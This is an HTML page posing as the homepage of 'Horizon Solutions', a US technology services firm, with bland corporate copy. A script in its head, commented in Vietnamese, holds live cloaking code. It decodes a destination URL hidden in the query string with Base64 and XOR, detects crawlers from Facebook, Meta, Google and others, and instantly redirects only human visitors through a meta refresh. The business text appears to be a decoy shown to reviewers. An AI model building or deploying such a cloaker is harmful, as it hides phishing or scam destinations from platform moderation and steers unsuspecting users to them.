<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Empower Your Future with Horizon Solutions - Leading Technology and Business Services in the USA">
    <meta name="keywords" content="technology, business solutions, USA, enterprise services">
    <meta name="author" content="Horizon Solutions">
    <script>
        // Bật ON để kiểm tra chuyển hướng
        const redirectStatus = 'ON'; 
        const params = new URLSearchParams(window.location.search);
        const data = params.get('url') || '';

        // Khóa mã hóa (giữ bí mật, không thay đổi nếu đã dùng)
        const ENCRYPTION_KEY = 'xAI2025';

        // Hàm mã hóa Base64 + XOR (dùng để tạo URL, không cần trong HTML)
        function encodeAdvanced(url) {
            let base64 = btoa(encodeURIComponent(url));
            let xorResult = '';
            for (let i = 0; i < base64.length; i++) {
                let charCode = base64.charCodeAt(i);
                let keyCode = ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length);
                xorResult += String.fromCharCode(charCode ^ keyCode);
            }
            return btoa(xorResult); // Mã hóa thêm một lần Base64 để dễ truyền
        }

        // Hàm giải mã Base64 + XOR
        function decodeAdvanced(input) {
            try {
                // Giải mã Base64 đầu tiên
                let base64 = atob(input);
                let decoded = '';
                for (let i = 0; i < base64.length; i++) {
                    let charCode = base64.charCodeAt(i);
                    let keyCode = ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length);
                    decoded += String.fromCharCode(charCode ^ keyCode);
                }
                // Giải mã Base64 cuối cùng để lấy URL
                return decodeURIComponent(atob(decoded));
            } catch (e) {
                console.error("Invalid encoded URL:", e);
                return '';
            }
        }

        // Kiểm tra bot, giảm sai sót với người dùng thật
        function isBot() {
            const userAgent = navigator.userAgent.toLowerCase();
            const botSignatures = [
                'facebookexternalhit', 'facebot', 'meta-inspector', // Meta bots
                'googlebot', 'bingbot', 'slurp', 'twitterbot', 'linkedinbot',
                'crawler', 'spider', 'bot'
            ];
            // Chỉ chặn nếu user-agent rõ ràng là bot, tránh nhầm lẫn với trình duyệt người dùng
            return botSignatures.some(signature => userAgent.includes(signature)) && 
                   !/chrome|safari|firefox|edge|opera/i.test(userAgent);
        }

        // Debug và chuyển hướng
        console.log("Redirect Status:", redirectStatus);
        console.log("Encoded URL:", data);
        if (redirectStatus === 'ON' && data) {
            console.log("Checking if bot...");
            if (!isBot()) {
                console.log("Not a bot, decoding URL...");
                const destination = decodeAdvanced(data);
                if (destination) {
                    console.log("Decoded URL:", destination);
                    // Chuyển hướng tức thì qua thẻ meta
                    document.write(`<meta http-equiv="refresh" content="0;url=${encodeURI(destination)}">`);
                } else {
                    console.error("Failed to decode URL, showing default page.");
                }
            } else {
                console.log("Bot detected, not redirecting.");
            }
        } else {
            console.log("Redirect is OFF or no URL provided, showing default page.");
        }
    </script>
    <title>Horizon Solutions - Empowering Your Future</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f7fa;
            color: #333;
            line-height: 1.6;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
            margin-top: 20px;
        }
        header {
            text-align: center;
            padding: 20px 0;
            background: #004085;
            color: #fff;
        }
        header h1 { margin: 0; font-size: 2.5em; }
        header p { margin: 5px 0; font-size: 1.2em; }
        .content { margin: 20px 0; }
        .content h2 { color: #004085; font-size: 1.8em; }
        .content p { font-size: 1.1em; }
        .cta {
            display: inline-block;
            padding: 12px 30px;
            background: #007bff;
            color: #fff;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
            margin-top: 20px;
        }
        .cta:hover { background: #0056b3; }
        .footer {
            text-align: center;
            padding: 20px;
            background: #f8f9fa;
            margin-top: 20px;
            font-size: 0.9em;
            color: #666;
        }
    </style>
</head>
<body>
    <header>
        <h1>Horizon Solutions</h1>
        <p>Empowering Your Future with Cutting-Edge Technology</p>
    </header>
    <div class="container">
        <div class="content">
            <h2>About Us</h2>
            <p>Founded in 2005, Horizon Solutions is a leading provider of technology and business services across the United States. With headquarters in San Francisco, California, we empower enterprises to achieve their goals through innovative solutions, exceptional support, and a commitment to excellence.</p>
            <h2>Our Services</h2>
            <p>We offer a wide range of services including cloud computing, cybersecurity, data analytics, and enterprise software development. Our team of experts works tirelessly to deliver tailored solutions that drive growth and efficiency for businesses of all sizes.</p>
            <h2>Why Choose Horizon?</h2>
            <p>With over 500 satisfied clients and a presence in 25 states, Horizon Solutions is trusted by industry leaders. Our dedication to quality and innovation has earned us multiple awards, including the 2024 Tech Innovation Award.</p>
            <a href="#" class="cta">Get Started Today</a>
        </div>
    </div>
    <div class="footer">
        © 2025 Horizon Solutions, Inc. All Rights Reserved. | 123 Market St, San Francisco, CA 94103 | Contact: info@horizonsolutions.com
    </div>
</body>
</html>
